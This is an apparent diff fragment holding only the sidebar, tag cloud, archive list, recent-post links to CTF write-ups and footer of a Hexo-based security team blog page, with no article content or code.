+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
